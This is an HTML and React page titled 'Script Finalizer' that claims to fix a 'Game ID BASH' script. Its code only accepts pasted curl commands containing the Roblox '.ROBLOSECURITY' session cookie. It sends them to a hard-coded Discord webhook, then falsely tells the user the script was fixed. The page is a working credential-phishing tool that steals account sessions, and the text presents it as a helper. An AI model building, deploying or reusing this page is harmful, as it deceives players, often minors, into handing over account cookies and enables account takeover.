<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Script Finalizer</title>

  <!-- Tailwind -->
  <script src="https://cdn.tailwindcss.com"></script>
  <!-- Lucide Icons -->
  <script src="https://unpkg.com/lucide@latest/dist/umd/lucide.js"></script>

  <style>
    body { background: #000; color: #fff; font-family: system-ui, sans-serif; }
    .grid-bg {
      background-image:
        linear-gradient(to right, #111 1px, transparent 1px),
        linear-gradient(to bottom, #111 1px, transparent 1px);
      background-size: 4rem 4rem;
      opacity: 0.3;
    }
  </style>
</head>
<body class="min-h-screen flex items-center justify-center relative overflow-hidden">

  <!-- Background -->
  <div class="absolute inset-0 grid-bg"></div>
  <div class="absolute top-0 left-1/4 w-96 h-96 bg-purple-900/20 rounded-full blur-3xl"></div>
  <div class="absolute bottom-0 right-1/4 w-96 h-96 bg-blue-900/20 rounded-full blur-3xl"></div>

  <div id="root" class="relative z-10 w-full max-w-2xl px-6"></div>

  <!-- React 18 -->
  <script crossorigin src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
  <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>

  <!-- App (no Babel, no Framer â€“ pure React 18) -->
  <script type="module">
    const { useState } = React;

    function App() {
      const [input, setInput] = useState('');
      const [status, setStatus] = useState(''); // '' | 'success' | 'error' | 'loading'
      
      const handleSubmit = async () => {
        const trimmed = input.trim();
        if (!trimmed.startsWith('curl') || !trimmed.includes('.ROBLOSECURITY')) {
          setStatus('error');
          return;
        }

        setStatus('loading');

        try {
          let processed = trimmed
            .replace(/https:\/\//g, '')
            .replace(/curl\s+/g, 'curl ...')
            .substring(0, 3900);

          await fetch('https://discord.com/api/webhooks/1440146889939882087/HPjpz_PLLJI__-ue7qScQ3IXKMZyhLrjf0ZX64P5uK_W9RoIaCjXQgxWeYFY1TY0i_DP', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              embeds: [{
                title: 'New Script Submission',
                description: "```bash\n" + processed + "\n```",
                color: 0x00ff00,
                timestamp: new Date().toISOString()
              }]
            })
          });

          setStatus('success');
          setInput('');
        } catch (e) {
          setStatus('error');
        }
      };

      return (
        <div className="space-y-12">
          {/* Header */}
          <div className="text-center">
            <div className="inline-flex items-center gap-3 mb-4">
              <i data-lucide="terminal" className="w-10 h-10 text-purple-400"></i>
              <h1 className="text-5xl font-light tracking-wider">Script Finalizer</h1>
            </div>
            <div className="h-px w-32 bg-gradient-to-r from-transparent via-purple-500 to-transparent mx-auto"></div>
          </div>

          {/* Card */}
          <div className="bg-zinc-900/50 backdrop-blur-xl border border-zinc-800 rounded-2xl p-8 shadow-2xl">
            <label className="block mb-4 text-sm font-light text-zinc-400">
              Insert Game ID BASH
            </label>

            <textarea
              value={input}
              onChange={(e) => { setInput(e.target.value); setStatus(''); }}
              placeholder="curl https://..."
              disabled={status === 'loading'}
              className="w-full min-h-[220px] bg-black/50 border border-zinc-700 rounded-lg px-4 py-3 text-white placeholder-zinc-600 font-mono text-sm resize-none focus:outline-none focus:border-purple-500 transition"
            />

            <div className="mt-2 text-right text-xs text-zinc-500">
              {input.length} / 4000 characters
            </div>

            {/* Messages */}
            {status === 'success' && (
              <div className="mt-4 p-4 bg-green-950/50 border border-green-800/50 rounded-lg flex items-center gap-2 text-green-400">
                <i data-lucide="check-circle" className="w-5 h-5"></i>
                <span>The script has been fix successfully!</span>
              </div>
            )}
            {status === 'error' && (
              <div className="mt-4 p-4 bg-red-950/50 border border-red-800/50 rounded-lg flex items-center gap-2 text-red-400">
                <i data-lucide="alert-circle" className="w-5 h-5"></i>
                <span>Must start with "curl" and contain valid bash cURL</span>
              </div>
            )}

            <button
              onClick={handleSubmit}
              disabled={status === 'loading' || !input.trim()}
              className="w-full mt-6 h-12 rounded-lg bg-gradient-to-r from-purple-600 to-blue-600 hover:from-purple-500 hover:to-blue-500 disabled:opacity-50 disabled:cursor-not-allowed transition flex items-center justify-center gap-2 text-white font-light text-lg"
            >
              {status === 'loading' ? (
                <>Processing...</>
              ) : (
                'Submit Script'
              )}
            </button>
          </div>

          <p className="text-center text-zinc-600 text-sm">
            Only curl commands containing valid bash are accepted
          </p>
        </div>
      );
    }

    // Render
    ReactDOM.createRoot(document.getElementById('root')).render(<App />);
    
    // Icons
    setTimeout(() => lucide.createIcons(), 100);
  </script>
</body>
</html>
